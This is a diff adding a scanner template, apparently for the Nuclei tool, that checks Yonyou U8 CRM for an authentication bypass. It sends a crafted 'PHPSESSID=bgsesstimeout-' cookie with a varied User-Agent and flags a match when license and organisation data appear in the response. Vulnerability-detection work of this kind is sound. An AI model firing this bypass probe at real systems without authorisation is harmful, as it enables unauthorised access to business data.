@@ -1,0 +1,40 @@
+id: yonyou-u8-crm-bgsesstimeout-auth-bypass
+info:
+  name: 用友U8 CRM bgsesstimeout 认证绕过
+  author: SleepingBag945
+  severity: high
+  description: 概率性触发
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3{{times}}
+        Sec-Purpose: prefetch;prerender
+        Purpose: prefetch
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Cookie: PHPSESSID=bgsesstimeout-
+        Connection: close
+
+    payloads:
+      times:
+        - 0
+        - 1
+        - 2
+        - 3
+        - 4
+        - 5
+        - 6
+        - 7
+        - 8
+        - 9
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"gblLicenseInfo","gblOrgID")
